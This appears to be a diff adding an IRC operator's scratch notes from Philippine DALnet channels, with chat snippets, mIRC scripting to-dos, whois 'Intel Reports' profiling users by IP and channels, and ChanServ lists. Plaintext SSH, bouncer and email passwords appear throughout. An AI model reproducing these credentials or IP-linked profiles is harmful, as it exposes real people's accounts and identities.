@@ -1,0 +1,3817 @@
+dl.dropboxusercontent.com
+
+[18:44:17] [+Randy] #coders
+[08:09:06] [Randy_] sneakers, /oper sneakers !coders
+[09:13:37] [+Randy] Bro, once oper up ka
+[09:13:55] [+Randy] Pwede mo use /samode #chan mode
+[09:14:16] [+Randy] It is an oper command, higher than normal /mode
+[09:14:36] [+Randy] /samode #coders +o sneakers
+[09:14:54] [+Randy] Will make you +o even if you don't have +o
+
+
+remove lag bar.
+check nick list color script.
+fix memo express :(
+listmemos - server specific responses
+insert code for events not applicable to UnderNet
+check away msg for invites. raw 301
+
+oidentd
+/etc/oidentd.conf
+service oidentd restart
+
+ https://minergate.com/a/b876760c0313ce2fc0623bac
+
+
+Guys I've noticed something regarding combobox. If I reference it inside: on *:DIALOG:name:edit:*: { if ($did == comboboxid) <----- won't process it when editing the combobox
+also doing a /did -r dialogid comboid <----- won't clear the text in the combo box
+
+another thing: //auser 201 acronix | echo -a Level check using nick alone: $level(acronix) | echo -a Level check using full address: $level($address(acronix,5))
+
+
+
+[22:17] [Randy] http://irc.ircmakati.com:14344
+[22:19] [sneakers] pano to bro.. hehe.. may username pass?
+[22:21] [Randy] username: sneakers pass: sne4k3r888#
+[22:21] [Randy] irc.ircmakati.com 14344
+
+connect -ssl irc.ipv6.dal.net +6697
+
+[00:28] [Randy] /server -m bsd.coders.ph 8570
+[00:29] [Randy] http://bsd.coders.ph:8570
+[00:29] [Randy] ZNC Pass: pl34sech4ng3me
+[00:29] [Randy] SSH: bsd.coders.ph / port 22 / pass 0:0:d0::1b:f01dsneak3rs IWillNeverLeaveYouNorForsakeYou
+[00:30] [Randy] username: unix
+
+[00:46] <@Randy> http://pickaface.net/
+[00:46] <@Randy> eto ata un gamit ko dati
+
+[13:28] [*status] +========================+======+=====+======+
+[13:28] [*status] | Host | Port | SSL | Pass |
+[13:28] [*status] +========================+======+=====+======+
+[13:28] [*status] | irc.ipv6.dal.net | 6697 | SSL | |
+[13:28] [*status] +------------------------+------+-----+------+
+[13:28] [*status] | 2604:8300:100:2009::2* | 6697 | SSL | |
+[13:28] [*status] +========================+======+=====+======+
+
+http://2tu.us/bv7  ravescript
+http://Radio.DavaoBoX.CoM:8127/listen.pls
+
+/run putty -D 22 asymptote.cluenet.org
+/run putty -D 22 negative.cluenet.org
+
+/run putty -D 22 newton.cluenet.org
+/run putty -D 22 arbelos.cluenet.org
+
+/run putty -D 22 delta.cluenet.org
+/run putty -D 22 cubed.cluenet.org
+/run putty -D 22 linear.cluenet.org
+/run putty -D 22 rho.cluenet.org
+
+
+arc.cluenet.org -- notcl
+ordinate.cluenet.org -- notcl
+mu.cluenet.org -- notcl
+nano.cluenet.org -- notcl
+origin.cluenet.org -- notcl
+riemann.cluenet.org -- notcl
+sine
+vector
+
+acctshell> lap
+_misc:initialvouch
+_misc:acctvote
+_misc:oldshellaccess
+acute:shellaccess
+asymptote:shellaccess
+linear:shellaccess
+mu:shellaccess
+negative:shellaccess
+newton:shellaccess
+rho:shellaccess
+xi:shellaccess
+[23:18] [Randy] Username: unix
+[23:18] [Randy] SSH: bsd.coders.ph
+[23:18] [Randy] IPv6: 2400:6180:0:d0::1b:f01d
+[23:21] [Randy] Znc port: 8570
+[23:21] [Randy] SSH Pass: 0:0:d0::1b:f01dsneak3rs
+[23:21] [Randy] ZNC Pass: pl34sech4ng3me
+[23:21] [Randy] SSH Port: 22
+[23:22] [Randy] /server -m bsd.coders.ph 8570
+[23:22] [Randy] http://bsd.coders.ph:8570
+[23:22] [Randy] If you want to change it
+[23:22] [Randy] The settings
+[23:23] [Randy] Pwede ka din create dyan additional users
+[23:23] [Randy] And additional network
+[23:23] [Randy] If you want guide kita then after you can you can play with the settings na
+[23:24] [Randy] Medyo tricky lang kasi yung pag connect nya sa isang irc server kasi set ko cya to use strict SSL
+[23:24] [Randy] meron pa mga fingerprint na kelangan before maka connect para secure lahat
+[23:27] [Randy] /server -m bsd.coders.ph 8570 unix:pl34sech4ng3me
+[23:27] [Randy] To connect to the bouncer
+
+polarity:shellaccess
+acctshell>
+
+[17:56] -NickServ- Info for Tofuboi-:
+[17:56] -NickServ- Last seen address : ~ReGeX@112.202.2.10
+
+
+[01:27] * shadowws (~shadowws@bb121-6-134-205.singnet.com.sg) has joined #makati
+[02:18]  ï  shhadows (~pepsi1@bb116-14-185-93.singnet.com.sg) - Singapore
+*!*@bb116-15-9-108.singnet.com.sg
+
+ ---------------[ RAVE InteL Report ]---------------
+ Whois On: nakatuwad (hanson@let.me.lick.Y-0-U.Org)
+ Real Name:  need something?
+ Channels: @#bolinao #djkorn @#westside #olongapo @#pangasinan #makati +#metromanila @#ncr #baguio @#loveless @#forsaken
+ Server: punch.va.us.dal.net - You are on the other side! Nasrudin shouted back.
+ Away: wak ka malikot baka mahugot!
+ Idle: 3hrs 51mins 42secs
+ SignOn: Monday, June 29th, 2009 at 8:06 AM
+ ---------------[ Reported 20:08:08 ]---------------
+FLOODER 7/2
+
+
+
+ ---------------[ RAVE InteL Report ]---------------
+ Whois On: MrBeAN (~nobody@125.212.49.101)
+ Real Name: nobody
+ Channels: #makati
+ Server: valhall.no.eu.dal.net - No reason to get excited
+ Idle: 2mins 59secs
+ SignOn: Friday, June 26th, 2009 at 10:16 PM
+ ---------------[ Reported 22:44:52 ]---------------
+Claiming to be in Copenhagen LOL
+said he is using psy but TIME reply is in the Phils
+
+
+
+[19:30] -ChanServ- AOp list for #mackmode
+[19:30] -ChanServ- 1 -   ^CHiLi^ (IceChat7@119.94.22.142)
+[19:30] -ChanServ- 2 -   Anthrax` (zyke@119.94.170.58)
+[19:30] -ChanServ- 3 -   carrots (~crop@125.63.124.74)
+[19:30] -ChanServ- 4 -   jinger (~hannah@125.212.20.201)
+[19:30] -ChanServ- 5 -   BebBot (babe@hunting.the.smartfox.us)
+[19:30] -ChanServ- 6 -   _MsEmz_ (~bxsyg@202.163.197.18)
+[19:30] -ChanServ- 7 -   _CHRiSTiNE_ (~mag@122.52.68.63)
+[19:30] -ChanServ- 8 -   Astr0man (~SqUeAkY@122.53.86.180)
+[19:30] -ChanServ- 9 -   [BukoJuz] (~New@wnpgmb0285w-ad03-16-36.dynamic.mts.net)
+[19:30] -ChanServ- 10 -   _ace_ventura_ (~kingjayti@24.130.30.9)
+[19:30] -ChanServ- 11 -   json25 (~json25@125.60.241.208)
+[19:30] -ChanServ- 12 -   Betty`BoOp (soleil@lasingero.inc.gs)
+[19:30] -ChanServ- 13 -   TheMatrix (matrix@qualitynet.cable-213-189-02.62.hitted.net)
+[19:30] -ChanServ- 14 -   otokodesu (~otokodesu@FLH1Aap096.kng.mesh.ad.jp)
+[19:30] -ChanServ- 15 -   MisS_EwAn (sirhcsiry@im.the.dj.so.listenmymusic.net)
+[19:30] -ChanServ- 16 -   Zerosix (~Zerosix@124.106.168.110)
+[19:30] -ChanServ- 17 -   bebot (scorpian77@ManilaDALnet.co.cc)
+[19:30] -ChanServ- 18 -   sheryll (~greatfano@ppp-69-237-101-152.dsl.irvnca.pacbell.net)
+[19:30] -ChanServ- End of list.
+[19:31] -ChanServ- SOp list for #mackmode
+[19:31] -ChanServ- 1 -   FishBraiN (~who@125.60.241.51)
+[19:31] -ChanServ- 2 -   ErwinPaul (Paul@ErwinPaul.us)
+[19:31] -ChanServ- 3 -   NiC0L3 (~pinky@l003010.zseriespenguins.ihost.com)
+[19:31] -ChanServ- 4 -   PiNKBeRRy (~pinky@190.244.26.116)
+[19:31] -ChanServ- 5 -   Mr_EwAn (nihw@i.love.doha.ircmaster.org)
+[19:31] -ChanServ- 6 -   blakkid (~Beer@119.93.229.193)
+[19:31] -ChanServ- 7 -   gracel (ganda@121.96.118.237)
+[19:31] -ChanServ- 8 -   Swoosh (~x@121.54.73.158)
+[19:31] -ChanServ- 9 -   shimmer_f (mj@did.you.take.my.damn.n4rc0tics.com)
+[19:31] -ChanServ- End of list.
+
+[19:29] -ChanServ- AKick list for #mackmode
+[19:29] -ChanServ- 1 -   *edz!*@*
+[19:29] -ChanServ- 2 -   *edz*!*@*
+[19:29] -ChanServ- 3 -   *lady_anonymous!*@*
+[19:29] -ChanServ- 4 -   *lady_anonymous*!*@*
+[19:29] -ChanServ- 5 -   lady_anonymous*!*@*
+[19:29] -ChanServ- 6 -   lady_anonymous (~iris@i.wants-your.info)
+[19:29] -ChanServ- 7 -   *!irish*@*
+[19:29] -ChanServ- 8 -   *irish!*@*
+[19:29] -ChanServ- 9 -   *sneakers!*@*
+[19:29] -ChanServ- 10 -   *!sneakers*@*
+[19:29] -ChanServ- 11 -   *chizky!*@*
+[19:29] -ChanServ- 12 -   *!chizky*@*
+[19:29] -ChanServ- 13 -   *!*@webchat.mibbit.com
+[19:29] -ChanServ- 14 -   *!kisses07*@*
+[19:29] -ChanServ- 15 -   kisses07 (~tseH@121.54.75.82)
+[19:29] -ChanServ- 16 -   *!tseH*@*
+[19:29] -ChanServ- 17 -   *tseH!*@*
+[19:29] -ChanServ- 18 -   *tseH!*@121.54.75.82
+[19:29] -ChanServ- 19 -   *!tseH*@121.54.75.82
+[19:29] -ChanServ- End of list.
+
+
+ ---------------[ RAVE InteL Report ]---------------
+ Whois On: babaeroAKO (~menard18@124.106.237.144)
+ Real Name: babaero
+ Channels: #makati #cebu #davao #manila
+ Server: novel.ix.us.dal.net - Pimpin' Miami all night long
+ Idle: 6hrs 59mins 47secs
+ SignOn: Sunday, June 7th, 2009 at 4:15 PM
+ ---------------[ Reported 18:14:47 ]---------------
+#phchat inviter 6.0
+
+RAVE SUGGESTIONS:
+
+broadcastmp3 on specific channels
+
+
+bopols
+Whois On: sabre (~iiiii@121.54.70.3)
+
+
+[20:38] * kiero was kicked by sneakers (-[ RAVE ]- (∑358∑))
+[20:38] * sneakers sets mode: +b *!*@119.94.102.157
+
+
+http://www.ibm.com/developerworks/community/
+
+32.97.40.52 makati johnnicole14344
+
+http://www.dal.net/admin/contactmassad.php3
+
+*!*@60.54.98.224
+
+7[ 4http://2tu.us/bhr ] Welcome to the Philippine Coders Association. Download RAVE Script it at http://channels.dal.net/ravescript/ Version Info: RAVE v3.03 Any questions/concerns? Email siLverbLade [ mailto:coder@transedge.com ]
+
+
+ ---------------[ RAVE InteL Report ]---------------
+ Whois On: popo- (~cute@modemcable073.153-23-96.mc.videotron.ca)
+ Real Name: jamjam
+ Channels: #ust #ateneo
+ Server: krypt.ca.us.dal.net - http://www.krypt.com - 100gbit of AWESOME.
+ Idle: 11mins 17secs
+ SignOn: Tuesday, April 7th, 2009 at 7:35 PM
+ ---------------[ Reported 23:32:08 ]---------------
+
+[23:26] [netad] [mooth (~lamo@71.145.187.159) ACTION] if you are looking for pinoymovies and mp3s just simple type /server irc.pinoyvidz.org then enter. see you there!
+
+[23:18] * mooth is using IRC client: mIRC v6.21 Khaled Mardam-Bey
+[23:18] [mooth FINGER reply]: u wont catch me!!! (baba22) Idle 13361 seconds
+
+[23:36] [popo- FINGER reply]: jamjam (jimi) Idle 943 seconds
+
+
+ ---------------[ RAVE InteL Report ]---------------
+ Whois On: |2pac| (~stop@c-24-7-149-222.hsd1.ca.comcast.net)
+ Real Name: cybercafe zone
+ Channels: #manila
+ Server: punch.va.us.dal.net - You are on the other side! Nasrudin shouted back.
+ Idle: 7mins 14secs
+ SignOn: Wednesday, April 8th, 2009 at 12:59 AM
+ ---------------[ Reported 01:07:36 ]---------------
+
+
+
+
+
+
+ ---------------[ RAVE InteL Report ]---------------
+ Whois On: Dec_ (~Dec@58.69.7.29)
+ Real Name: Dec
+ Channels: #cebu #davao #manila
+ Server: swiftco.wa.us.dal.net - www.swiftco.net - Swift Communications
+ Idle: 3hrs 45mins
+ SignOn: Tuesday, March 10th, 2009 at 11:22 AM
+ ---------------[ Reported 15:07:49 ]---------------
+
+[15:23] [Dec_ FINGER reply]: Dec (Dec@gmail.com) Idle 14435 seconds
+
+#sarap
+
+
+ ---------------[ RAVE InteL Report ]---------------
+ Whois On: Knuckle`s (~knuckles@58.69.6.208)
+ Real Name: Knuckle will rock u
+ Channels: #cebu #davao #makati #manila
+ Server: swiftco.wa.us.dal.net - www.swiftco.net - Swift Communications
+ Idle: 43mins 14secs
+ SignOn: Thursday, March 12th, 2009 at 9:48 AM
+ ---------------[ Reported 10:32:01 ]---------------
+[10:32] [Knuckle`s FINGER reply]: Knuckle will rock u (Knucks) Idle 2556 seconds
+
+
+==============================================================
+#kantot
+ ---------------[ RAVE InteL Report ]---------------
+ Whois On: ZaFo (~roomboy@221.209.18.18)
+ Real Name: Delfin Alfon
+ Channels: #pinoyirc #makati #lambingan #alabang
+ Server: swiftco.wa.us.dal.net - www.swiftco.net - Swift Communications
+ Idle: 14mins 19secs
+ SignOn: Friday, November 16th, 2007 at 8:55 AM
+ ---------------[ Reported 09:09:26 ]---------------
+
+[09:09] * ZaFo is using IRC client: mIRC v6.21 Khaled Mardam-Bey
+[09:09] [ZaFo FINGER reply]: Delfin Alfon (roomboy@yc) Idle 728 seconds
+
+ ---------------[ RAVE InteL Report ]---------------
+ Whois On: [--DEMONYITO--] (~roomboy@222.173.244.242)
+ Real Name: Delfin Alfon
+ Channels: #pinoyirc #makati #laplapan #lambingan #ateneo #Alabang
+ Server: hollywood.ix.us.dal.net - Gotta Wear Shades
+ Idle: 4mins 26secs
+ SignOn: Friday, November 16th, 2007 at 3:09 PM
+ ---------------[ Reported 15:14:15 ]---------------
+=======================================================================
+
+
+
+
+ *+*+*+*+* [ RAVE Intel Report ] *+*+*+*+*
+ Whois On: zaira21 (~1ad@210.16.41.29)
+ Real Name: hgjgh
+ Channels: #qc
+ Server: hotspeed.sg.as.dal.net - Hotspeed.com.sg Client Server
+ Idle: 1min 12secs
+ SignOn: Sunday, November 4th, 2007 at 9:40 PM
+ *+*+*+*+* [ End of Intel Report ] *+*+*+*+*
+
+
+
+==========================================================================[07:02] [invite] [Delicoiussses (~xolj@222.127.223.69) ACTION] PLAY ME PLEASE,HARDER!!... double click here =>  #HIMASAN
+
+#himasan
+ ---------------[ RAVE InteL Report ]---------------
+ Whois On: jaja (~yan@124.6.189.254)
+ Real Name: hihidc
+ Channels: +#delasalle #lasalle #ceu #feu #dagupan +#ILOCOS +#manilacity +#iqtrivia #bicol #marikina #davao #assumption #makati #ust #iloilo #cebu #ateneo
+ Server: swiftco.wa.us.dal.net - www.swiftco.net - Swift Communications
+ Idle: 39mins 23secs
+ SignOn: Saturday, November 17th, 2007 at 12:00 PM
+ ---------------[ Reported 12:40:47 ]---------------
+
+[07:00] * nHizzz is using IRC client: mIRC v6.21 Khaled Mardam-Bey
+[07:00] [nHizzz FINGER reply]: 08 (heilee@) Idle 14215 seconds
+[07:00] [jenjen23 FINGER reply]: hihidc (hihidc) Idle 26440 seconds
+[07:01] * jenjen23 is using IRC client: mIRC v6.21 Khaled Mardam-Bey
+
+ ---------------[ RAVE InteL Report ]---------------
+ Whois On: jenjen23 (~tgg@124.6.189.254)
+ Real Name: hihidc
+ Channels: #salsalan #laplapan #bi-manila +#delasalle #lasalle #ceu #feu #dagupan +#iqtrivia #bicol #assumption #ust #cebu #ateneo #trinoma
+ Server: swiftco.wa.us.dal.net - www.swiftco.net - Swift Communications
+ Idle: 7hrs 25mins 14secs
+ SignOn: Wednesday, November 21st, 2007 at 11:38 PM
+ ---------------[ Reported 07:03:54 ]---------------
+
+
+ ---------------[ RAVE InteL Report ]---------------
+ Whois On: nHizzz (~heilee@124.6.189.254)
+ Real Name: 08
+ Channels: #nhisa +#Munti #philmanila +#qc-net #halfway @#YM_conference @#apartment @#macapagal @#atribida
+ Server: swiftco.wa.us.dal.net - www.swiftco.net - Swift Communications
+ NickServ Info: nHizzz has identified for this nick
+ Idle: 4hrs 37mins 33secs
+ SignOn: Wednesday, November 21st, 2007 at 4:02 PM
+ ---------------[ Reported 07:03:58 ]---------------
+
+
+
+======================================================================
+#whizards #sarap
+
+[14:36] * mulack was kicked by siLverbLade (HULI KA! -[ RAVE ]- (∑009∑))
+[14:36] * siLverbLade sets mode: +b *!*@12-202-85-61.client.mchsi.com
+[14:36] * |bloodlust- was kicked by siLverbLade (--ª Banned by [ siLverbLade ] -[ RAVE ]- (∑010∑))
+
+ ---------------[ RAVE InteL Report ]---------------
+ Whois On: mulack (~ekick@12-202-85-61.client.mchsi.com)
+ Real Name: waa
+ Channels: #bahay #qc #bicol
+ Server: swiftco.wa.us.dal.net - www.swiftco.net - Swift Communications
+ Idle: 1min 54secs
+ SignOn: Monday, November 5th, 2007 at 1:51 PM
+ ---------------[ Reported 14:40:40 ]---------------
+
+ ---------------[ RAVE InteL Report ]---------------
+ Whois On: dimensi0n_crack (~misie@c-67-165-84-87.hsd1.pa.comcast.net)
+ Real Name: miesie
+ Server: swiftco.wa.us.dal.net - www.swiftco.net - Swift Communications
+ Idle: 0secs
+ SignOn: Monday, November 5th, 2007 at 2:05 PM
+ ---------------[ Reported 14:41:02 ]---------------
+
+14[14:36] [mulack FINGER reply]: 6c10C6c3-14B10o6t6 V10e6Æ10 5.11 14 7 U devil!
+
+[14:42] * mulack is using IRC client: mIRC32 v5.82 K.Mardam-Bey
+
+ ---------------[ RAVE InteL Report ]---------------
+ Whois On: |bloodlust- (~bloodlust@12-202-85-61.client.mchsi.com)
+ Real Name: bloodlust
+ Channels: #lambingan #heart-clinic @#tagaytay #qc-net @#philmanila @#pasaway #Oneball #munti #macintosh #barkadahan
+ Server: punch.va.us.dal.net - Experience comes from bad judgement.
+ Nickserv Information: |bloodlust- has identified for this nick
+ Idle: 13secs
+ SignOn: Monday, November 5th, 2007 at 2:14 PM
+ ---------------[ Reported 14:46:25 ]---------------
+
+
+
+======================================================================
+
+
+
+
+ *+*+*+*+* [ RAVE Intel Report ] *+*+*+*+*
+ Whois On: traumatec (~volts@dynamic-acs-72-23-164-59.zoominternet.net)
+ Real Name: idle
+ Channels: #filipino #makati #ateneo #manila
+ Server: swiftco.wa.us.dal.net - www.swiftco.net - Swift Communications
+ Idle: 3secs
+ SignOn: Sunday, October 7th, 2007 at 2:44 PM
+ *+*+*+*+* [ End of Intel Report ] *+*+*+*+*
+
+#kolehiyala
+
+
+
+
+
+ *+*+*+*+* [ RAVE Intel Report ] *+*+*+*+*
+ Whois On: Wiggle (world@mIRCChat.Org)
+ Real Name: master
+ Channels: @#pinoynetworks @#pque @#perpetual @#munti @#manilacute @#kantot @#himasan @#apartment #ust #makati
+ Server: punch.va.us.dal.net - Experience comes from bad judgement.
+ Nickserv Information: Wiggle has identified for this nick
+ Idle: 3hrs 14mins 8secs
+ SignOn: Thursday, October 4th, 2007 at 12:45 AM
+ *+*+*+*+* [ End of Intel Report ] *+*+*+*+*
+
+
+ *+*+*+*+* [ RAVE Intel Report ] *+*+*+*+*
+ Whois On: Simpleman-afk (~yyv@222.127.223.73)
+ Real Name: XaMo
+ Channels: #filipino #cybersex #teen #gay +#iqtrivia #mansociety #laguna #bicol #ateneo #trivia #salsalan #iloilo #makati #cebu
+ Server: swiftco.wa.us.dal.net - www.swiftco.net - Swift Communications
+ Idle: 7hrs 27mins 53secs
+ SignOn: Wednesday, October 3rd, 2007 at 11:22 PM
+ *+*+*+*+* [ End of Intel Report ] *+*+*+*+*
+
+
+ *+*+*+*+* [ RAVE Intel Report ] *+*+*+*+*
+ Whois On: hematoma_f (~anak_pere@124.6.189.254)
+ Real Name: ====
+ Channels: #mapua #makati
+ Server: swiftco.wa.us.dal.net - www.swiftco.net - Swift Communications
+ Idle: 31secs
+ SignOn: Sunday, September 30th, 2007 at 11:22 PM
+ *+*+*+*+* [ End of Intel Report ] *+*+*+*+*
+
+ *+*+*+*+* [ RAVE Intel Report ] *+*+*+*+*
+ Whois On: Xamos-afk (~jda@222.127.223.70)
+ Real Name: XaMo
+ Channels: #cybersex #trivia_world #trivia #salsalan #cafeparadise #gay #marikina #lasalle #delasalle #iloilo #cebu #zamboanga #davao
+ Server: swiftco.wa.us.dal.net - www.swiftco.net - Swift Communications
+ Idle: 3hrs 49mins 59secs
+ SignOn: Tuesday, October 2nd, 2007 at 3:07 AM
+ *+*+*+*+* [ End of Intel Report ] *+*+*+*+*
+
+[06:58] [Xamos-afk FINGER reply]: XaMo (XaMo) Idle 13413 seconds
+[06:58] * Xamos-afk is using IRC client: mIRC v6.21 Khaled Mardam-Bey
+[06:58] * Touchme2 is using IRC client: mIRC v6.21 Khaled Mardam-Bey
+[06:58] [Touchme2 FINGER reply]: u wont catch me!!! (none) Idle 13262 seconds
+
+#himasan
+
+
+%SystemRoot%\system32\SHELL32.dll
+
+
+ *+*+*+*+* [ RAVE Intel Report ] *+*+*+*+*
+ Whois On: Sidneyboy (~bord@89.4.16.98)
+ Real Name: bord
+ Channels: #ateneo #manila
+ Server: loyalty.ix.us.dal.net - DALnet IX Client Server
+ Idle: 2secs
+ SignOn: Tuesday, October 3rd, 2006 at 3:36 PM
+ *+*+*+*+* [ End of Intel Report ] *+*+*+*+*
+busy ident
+
+
+
+ ï  Joe_YOung^^ (petro@203.115.176.232) - unknown
+
+ *+*+*+*+* [ RAVE Intel Report ] *+*+*+*+*
+ Whois On: Jemille_Maog (gasga@203.115.176.183)
+ Real Name: gagas
+ Channels: #makati #ateneo #cebu
+ Server: redemption.ix.us.dal.net - DALnet IX Client Server
+ Idle: 4secs
+ SignOn: Wednesday, August 30th, 2006 at 11:40 PM
+ *+*+*+*+* [ End of Intel Report ] *+*+*+*+*
+gitara trivianation
+
+
+
+ *+*+*+*+* [ RAVE Intel Report ] *+*+*+*+*
+ Whois On: sensitiveguy`` (furubutu@c-71-229-178-124.hsd1.co.comcast.net)
+ Real Name: sensualdude
+ Channels: #cebu #ateneo
+ Server: punch.va.us.dal.net - Such whimsical agony!
+ Idle: 20mins 4secs
+ SignOn: Sunday, August 20th, 2006 at 4:48 AM
+ *+*+*+*+* [ End of Intel Report ] *+*+*+*+*
+
+
+*+*+*+*+* [ SWAT Intel Report ] *+*+*+*+*
+Whois On: Mig26 (Mig26@n219073043086.netvigator.com)
+Real Name: fijsfsd
+Channels: #ateneo #makati
+Server: broadway.ny.us.dal.net - The Great White Way
+*+*+*+*+* [ End of Intel Report ] *+*+*+*+*
+
+* machinist`` (~tuklaw@203.92.10.200) Quit (Excess Flood)
+
+
+
+setup mail server
+linux s390
+
+
+
+195.50.191.14:6667
+194.14.236.50:6667
+195.50.191.12:6667
+202.91.34.9:6667
+61.6.39.100:6667
+
+149.9.1.16
+194.68.45.50
+
+61.6.39.100
+202.91.34.9
+<chikoy> jade.va.us.dal.net
+
+makati@popmail.com
+xavierph@popmail.com
+pass:nokiasamsung
+answer sa secert is batman
+www.popmail.com
+
+
+
+
+
+openfire r0b0matr1x000777
+
+
+
+r0b0syst3m505 blackwater
+
+chikoy5280
+
+
+
+
+intel excalibur r0b0t1cs
+swat
+
+
+*+*+*+*+* [ SWAT Intel Report ] *+*+*+*+*
+Whois On: baby_papoako (~taduakoeh@64.163.146.130)
+Real Name: lolx
+Channels: #ateneo #manila
+Server: matrix.de.eu.dal.net - www.arcor.de - Arcor Online Services
+*+*+*+*+* [ End of Intel Report ] *+*+*+*+*
+
+
+
+/msg MemoServ@services.dal.net LIST
+
+
++ 67.43.224.76 == cisco.netw0rks.net
+
+
+http://users.cjb.net/royalscar/logo01.jpg
+
+
+/server ads
+
+
+*+*+*+*+* [ SWAT Intel Report ] *+*+*+*+*
+Whois On: SaLoMoN_2 (~SaLoMoN_2@81.169.131.203)
+Real Name: SaLoMoN
+Server: broadway.ny.us.dal.net - The Great White Way
+*+*+*+*+* [ End of Intel Report ] *+*+*+*+*
+
+*+*+*+*+* [ SWAT Intel Report ] *+*+*+*+*
+Whois On: wisconsin` (~reccreati@c-67-174-114-136.hsd1.co.comcast.net)
+Real Name: recreation
+Channels: #ateneo #AllNiteCafe #chan
+Server: rumble.fl.us.dal.net - Get ready to Rumble
+Idle: 16hrs 51mins 25secs
+SignOn: Wednesday, November 9th, 2005 at 2:05 PM
+*+*+*+*+* [ End of Intel Report ] *+*+*+*+*
+-> [wisconsin`] FINGER
+[wisconsin` FINGER reply]: recreation (reccreation@yahoo.com) Idle 36230 seconds
+-> [wisconsin`] VERSION
+[wisconsin` VERSION reply]: mIRC v6.16 Khaled Mardam-Bey
+
+
+Whois On: ZzzZ (col@211.57.5.129)
+Real Name: @@
+Channels: #katipunan #DavaoCity
+Server: rumble.fl.us.dal.net - Get ready to Rumble
+Idle: 1min 11secs
+SignOn: Tuesday, November 8th, 2005 at 8:14 PM
+[ZzzZ FINGER reply]: tesd (wolf@lalalala.la) Idle 4809 seconds
+[ZzzZ VERSION reply]: mIRC v6.16 Khaled Mardam-Bey
+
+
+Whois On: wislon` (~wislon@c-71-56-233-86.hsd1.co.comcast.net)
+Real Name: wislon
+Channels: #baguio #ateneo #cebu
+Server: rumble.fl.us.dal.net - Get ready to Rumble
+Idle: 7hrs 15mins 46secs
+SignOn: Tuesday, November 8th, 2005 at 10:52 AM
+
+
+Careeran: 
+Whois On: ^the^admiral^ (diablo@210.14.46.66)
+*+*+*+*+* [ SWAT Intel Report ] *+*+*+*+*
+Whois On: Paladin_19 (gee@210.14.46.66)
+Real Name: ...
+Channels: #dagupan #baguio #cyberchat #feu #adzu #wmsu #filipino #laguna #bacolod #bicol #cebu #ust #zamboanga #davao #manila #ateneo #lasalle #tropang_gapo
+Server: rumble.fl.us.dal.net - Get ready to Rumble
+*+*+*+*+* [ End of Intel Report ] *+*+*+*+*
+
+
+avenida:
+*+*+*+*+* [ SWAT Intel Report ] *+*+*+*+*
+Whois On: b|g_ch|co_ (~-__-@210.23.169.24)
+Real Name: -==-
+Channels: #cebu #manila #ateneo #ust #makati #dlsu #lasalle
+Server: redemption.ix.us.dal.net - DALnet IX Client Server
+*+*+*+*+* [ End of Intel Report ] *+*+*+*+*
+
+
+
+Once you receive the key, simply replace the text "nokey" in the pipe source code (mathetes-pipe.tcl for eggdrops) with your key. Until a valid access key is put in place in your pipe, your access to the Mathetes engine will be non-functional. Apologies for the inconvenience. 
+
+
+
+<jHeYmE> un color combintaion ng silver and baby blue
+<jHeYmE> un mga navigation buttons...i want it in flash
+<jHeYmE> kung magagawan nya ng logo ang makati wud be nice
+
+
+
+
+http://www.desktopmobiles.com/
+http://codewar.net/cuts/
+http://secant.chules.net/misc/oldusers.html
+
+
+*** hill_locke (Im-Away@203.135.0.238) has left #mapua (15/0,15/15,14/14,1/0,1 LOVERSS Inviter SCRIPT 14,1\15,14\...)
+
+#kalibugan
+
+ *+*+*+*+* [ RAVE Intel Report ] *+*+*+*+*
+ Whois On: NiceGuy25 (CoolMan@203.215.121.203)
+ Real Name: ergheyger
+ Channels: #iloilo #bacolod #cebu
+ Server: redemption.ix.us.dal.net - DALnet IX Client Server
+ Idle: 39secs
+ SignOn: Friday, July 28th, 2006 at 2:00 PM
+ *+*+*+*+* [ End of Intel Report ] *+*+*+*+*
+
+
+
+*+*+*+*+* [ SWAT Intel Report ] *+*+*+*+*
+Whois On: Le0nards (~virgo@203.215.78.117)
+Real Name: faint the ocean
+Channels: #adzu #iloilo #zamboanga #davao #ateneo #manila
+Server: mesra.kl.my.dal.net - Jaring DALnet Client Server
+*+*+*+*+* [ End of Intel Report ] *+*+*+*+*
+
+
+Whois On: jigsters (~jegs@203.215.78.86)
+Real Name: willem
+
+patrickM18
+*+*+*+*+* [ SWAT Intel Report ] *+*+*+*+*
+Whois On: Trekmyster (~master@203.215.78.85)
+Real Name: Master is the name
+Channels: #adzu #dagupan #iloilo #makati #usa #ust #zamboanga #ateneo #manila
+Channels: #adzu #dagupan #iloilo #makati #ust #zamboanga #ateneo
+Server: mesra.kl.my.dal.net - Jaring DALnet Client Server
+*+*+*+*+* [ End of Intel Report ] *+*+*+*+*
+
+*+*+*+*+* [ SWAT Intel Report ] *+*+*+*+*
+Whois On: Noelly (~nelly@203.215.78.82)
+Real Name: Noel
+Channels: #adzu #dagupan #iloilo #makati #usa #ust #zamboanga #ateneo #manila
+Server: rumble.fl.us.dal.net - Get ready to Rumble
+*+*+*+*+* [ End of Intel Report ] *+*+*+*+*
+
+
+
+
+nice_maslog2002@yahoo.com
+
+ Welcome to #xavier  "VERITAS LIBERABIT VOS (The truth shall set you free) Please Visit http://www.xu.edu.ph/xuonline/ 
+-ChanServ- AOp list for #xavier
+-ChanServ- 1 -   {^JoHn^Y} (~sunnyrael@210.14.22.154)
+-ChanServ- 2 -   {^F|ReX^} (~rzp21@202.84.114.98)
+-ChanServ- 3 -   brake^t (onin@PENTIUM.4.make.my.stable-servers.info)
+-ChanServ- 4 -   |LordMiong| (miong@IrcHelper.IrcManiac.ircmaster.org)
+-ChanServ- 5 -   Brainiacs (~BOYKINS@210.213.145.205)
+-ChanServ- 6 -   onyok (onyok@Stockholm.SE.Eu.Undernet-ph.info)
+-ChanServ- 7 -   Anc|entEnemy (~unknown@210.213.150.52)
+-ChanServ- 8 -   Jomar (~Nice@210.213.191.41)
+-ChanServ- 9 -   katskie (quadroon@AP-203.167.26.242.sysads.com)
+-ChanServ- 10 -   atch (Keith@64.84.104.136)
+-ChanServ- 11 -   chirwin_dark (~brake@210.5.111.119)
+-ChanServ- 12 -   H20[Li|y] (onin@my.huggybear.info)
+-ChanServ- 13 -   scryptor (vholtz@Darkstar.AceShells.com)
+-ChanServ- 14 -   nfinitum (nfinitum@holy.ircmaster.org)
+-ChanServ- 15 -   KooLserv (intel@chules.net)
+-ChanServ- 16 -   BlackWater (swat@chules.net)
+-ChanServ- 17 -   sherryll (~user@203.160.177.16)
+-ChanServ- End of list.
+-ChanServ- SOp list for #xavier
+-ChanServ- 1 -   LaDy_iCe (~icegurl2@191.Red-81-34-209.dynamicIP.rima-tde.net)
